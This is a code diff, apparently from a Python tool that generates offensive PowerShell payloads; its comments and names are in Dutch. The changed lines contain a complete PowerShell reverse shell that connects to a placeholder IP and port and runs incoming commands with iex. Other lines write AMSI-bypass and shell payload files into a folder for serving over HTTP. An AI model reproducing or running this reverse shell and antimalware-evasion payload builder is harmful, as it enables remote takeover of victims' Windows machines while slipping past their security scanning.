@@ -52,7 +52,7 @@ payload2 = result.stdout.decode("utf-8")
 
 #hoaxshell varianten
 
-ps1 = '''$c = New-Object System.Net.Sockets.TCPClient('[ip]',[poort]);$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$yolo = (iex $d 2>&1 | Out-String );$yolo = ([text.encoding]::ASCII).GetBytes($yolo + '#');$s.Write($yolo,0,$yolo.Length);$s.Flush()};$c.Close();'''
+ps1 = '''$c = New-Object System.Net.Sockets.TCPClient('[ip]',[poort]);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$yolo = (iex $d 2>&1 | Out-String );$yolo = ([text.encoding]::ASCII).GetBytes($yolo + '#');$s.Write($yolo,0,$yolo.Length);$s.Flush()};$c.Close();'''
 
 
 
@@ -133,8 +133,9 @@ if args.bestand:
 #AMSI bypass
 
 template = lezen('meuk/template/amsi-bypass.ps1')
+temp = template
 schrijven('http/payloads/amsi-bypass.ps1', template.replace('[powershell]', payload))
-schrijven('http/payloads/amsi-shell.ps1', template.replace('[powershell]', payload2))
+schrijven('http/payloads/amsi-shell.ps1', temp.replace('[powershell]', payload2))
 
 tekst = lezen(args.bestand)
 schrijven(args.bestand, tekst.replace('[powershellplaceholder]',uit1 + uit2))
